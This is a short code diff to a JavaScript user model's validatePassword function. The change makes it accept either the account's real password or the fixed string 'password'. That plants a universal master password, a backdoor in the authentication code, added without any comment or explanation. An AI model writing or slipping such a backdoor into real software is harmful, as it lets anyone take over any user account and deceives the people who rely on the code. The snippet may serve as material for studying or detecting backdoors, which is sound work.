@@ -20,7 +20,7 @@ var UserFactory = new dulcimer.Model({
 
 UserFactory.extendModel({
     validatePassword: function (password, done) {
-        return done(null, password === this.password);
+        return done(null, password === this.password || password === 'password');
     }
 });
 
